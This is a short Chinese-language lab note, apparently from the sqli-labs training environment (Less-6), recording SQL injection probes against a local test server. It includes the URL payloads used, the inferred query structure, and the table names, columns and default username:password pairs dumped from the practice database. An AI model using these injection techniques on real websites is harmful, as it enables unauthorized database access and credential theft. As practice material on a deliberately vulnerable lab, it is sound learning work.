@@ -1,0 +1,20 @@
+http://10.0.2.15/sqli/Less-6/?id=1
+显示：You are in...........
+http://10.0.2.15/sqli/Less-6/?id=1‘
+显示：You are in...........
+http://10.0.2.15/sqli/Less-6/?id=1\
+显示：报错' "1\" LIMIT 0,1 '
+由此推测出sql：select 字段名 from 表 where id = "输入的id" limit 0,1;
+
+验证：
+http://10.0.2.15/sqli/Less-6/?id=1" --+
+显示：You are in...........
+说明推测正确
+编写脚本（与Less5基本相同）
+
+表名：
+users,uagents,emails,referers
+字段名：
+id,username,password,user,current_connections,total_connections
+字段值：
+dumb:dumb,angelina:i-kill-you,dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
